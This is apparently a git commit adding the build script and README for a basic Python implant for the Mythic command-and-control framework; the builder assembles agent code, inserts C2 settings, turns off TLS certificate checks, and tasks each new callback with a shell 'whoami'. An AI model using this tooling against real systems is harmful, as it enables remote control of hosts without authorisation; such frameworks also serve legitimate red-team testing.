0d211716ead4ae0cc25de0264333596288f75d85
kali <kali@Kali-XPS15>
2024-06-22 21:02:49 +0200

    First commit

---
+++ Payload_Type/python_services/mxdl_agent/agent_functions/builder.py
@@ -0,0 +1,120 @@
+from mythic_container.PayloadBuilder import *
+from mythic_container.MythicCommandBase import *
+from mythic_container.MythicRPC import *
+
+import json
+import os
+import pathlib
+
+
+class MxdlAgent(PayloadType):
+    name = "mxdl_agent"  # NEEDS TO BE THE SAME AS THE DIRECTORY THE AGENT IS IN
+    file_extension = "py"
+    author = "@maximedelis"
+    supported_os = [SupportedOS.Linux, SupportedOS.MacOS, SupportedOS.Windows]
+    wrapper = False  # If we want to use a wrapper like scarescrow
+    wrapped_payloads = []  # If wrapper, list of wrapper payloads to use
+    note = """Basic Implant in Python"""  # Description
+    supports_dynamic_loading = False  # Support of dynamic code loading
+    c2_profiles = ["http"]  # Listener types
+    mythic_encrypts = False  # is the encryption handled by Mythic
+    translation_container = None  # "MxdlTranslator"
+    build_parameters = [  # Array if we want custom parameters during build
+        BuildParameter(
+            name="output",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Choose output format (lol)",
+            choices=["py"],
+            default_value="py"
+        )
+    ]
+    agent_path = pathlib.Path(".") / "mxdl_agent"
+    agent_icon_path = agent_path / "agent_functions" / "bug.svg"
+    agent_code_path = agent_path / "agent_code"
+
+    build_steps = [  # Build steps
+        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
+        BuildStep(step_name="Configuring", step_description="Stamping in configuration values"),
+        BuildStep(step_name="Compiling", step_description="Compiling the agent...")
+    ]
+
+    async def build(self) -> BuildResponse:  # Build function called when an agent is generated
+        resp = BuildResponse(status=BuildStatus.Success)
+        build_msg = ""
+
+        try:
+            command_code = ""
+            for cmd in self.commands.get_commands():
+                command_path = os.path.join(self.agent_code_path, cmd + ".py")
+                if not command_path:
+                    build_msg += "{} command not available for {}.\n".format(cmd, self.get_parameter("python_version"))
+                else:
+                    command_code += (
+                            open(command_path, "r").read() + "\n"
+                    )
+            base_code = open(os.path.join(self.agent_code_path, "main_agent.py"), "r").read()
+
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Gathering Files",
+                StepStdout="Found all files for payload",
+                StepSuccess=True
+            ))
+
+            base_code = base_code.replace("UUID_HERE", self.uuid)
+            base_code = base_code.replace("#COMMANDS_HERE", command_code)
+
+            for c2 in self.c2info:
+                profile = c2.get_c2profile()["name"]
+
+                for key, val in c2.get_parameters_dict().items():
+                    # if key == "AESPSK":
+                    #     base_code = base_code.replace(key, val["enc_key"] if val["enc_key"] is not None else "")
+                    # el
+                    if not isinstance(val, str):
+                        base_code = base_code.replace(key, json.dumps(val).replace("false", "False").replace("true",
+                                                                                                             "True").replace(
+                            "null", "None")
+                                                      )
+                    else:
+                        base_code = base_code.replace(key, val)
+
+            base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
+            base_code = base_code.replace("#CERTSKIP",
+                """
+        gcontext = ssl.create_default_context()
+        gcontext.check_hostname = False
+        gcontext.verify_mode = ssl.CERT_NONE\n""")
+
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Configuring",
+                StepStdout="Configuration complete",
+                StepSuccess=True
+            ))
+
+            if build_msg != "":
+                resp.build_stderr = build_msg
+                resp.set_status(BuildStatus.Error)
+
+            resp.payload = base_code.encode()
+            resp.build_message = "Successfully built!"
+
+        except Exception as e:
+            resp.build_stderr = str(e)
+            resp.status = BuildStatus.Error
+            return resp
+
+        return resp
+
+    # Automatically called when a new callback is received
+    async def on_new_callback(self, newCallback: PTOnNewCallbackAllData) -> PTOnNewCallbackResponse:
+        new_task_resp = await SendMythicRPCTaskCreate(MythicRPCTaskCreateMessage(
+            AgentCallbackID=newCallback.Callback.AgentCallbackID,
+            CommandName="shell",
+            Params="whoami",
+        ))
+        if new_task_resp.Success:
+            return PTOnNewCallbackResponse(AgentCallbackID=newCallback.Callback.AgentCallbackID, Success=True)
+        return PTOnNewCallbackResponse(AgentCallbackID=newCallback.Callback.AgentCallbackID, Success=False,
+                                       Error=new_task_resp.Error)
---
+++ README.md
@@ -0,0 +1,13 @@
+# BasePythonAgent
+
+A basic Python agent. Based on Medusa.
+
+## Setup
+
+- Update the `rabbitmq_config.json` file with the correct RabbitMQ server information.
+- Update the `generate_payload.py` file with the correct Mythic login password & host.
+
+## Agent commands
+
+- `shell <command>`: Execute a shell command.
+- `cd <directory>`: Change the current working directory.
